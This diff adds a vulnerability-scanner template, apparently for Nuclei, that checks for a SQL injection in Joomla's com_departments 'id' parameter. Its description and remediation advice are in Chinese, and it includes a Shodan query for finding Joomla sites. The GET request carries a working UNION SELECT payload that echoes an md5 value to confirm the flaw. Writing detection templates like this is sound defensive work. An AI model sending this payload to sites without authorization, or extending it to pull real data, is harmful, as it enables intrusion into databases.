@@ -1,0 +1,33 @@
+id: joomla-departments-sql-injection
+
+info:
+  name: "Joomla `departments` 参数 SQL 注入漏洞"
+  author: ritikchaddha
+  severity: high
+  description: |
+    Joomla! 的 `com_departments` 参数存在 SQL 注入漏洞，攻击者可利用该漏洞获取数据库中的敏感信息、篡改数据，并在受影响站点的上下文中执行未授权的管理操作。
+  reference:
+    - https://github.com/opensec-cn/kunpeng/blob/master/plugin/json/joomla_departments_sqli.json
+    - https://github.com/w3bd0gs/cocoworker/blob/master/plugins/beebeeto/poc_2014_0170.py
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+    shodan-query: http.component:"Joomla"
+  tags: Joomla
+  remediation: >-
+    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
+
+variables:
+  num: "999999999"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5({{num}}),3,4,5,6,7,8--"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5(num)}}'
+        # digest: 4a0a0047304502205ebb6b70c77a4f350918d0374392e6035f11ca4e1d49069fa87ce3aa251bd81b022100e1c99f4bff7e372804a3b23eb08678db549385cb31bab4539d0fe41508d47e7e:922c64590222798bb761d5b6d8e72950
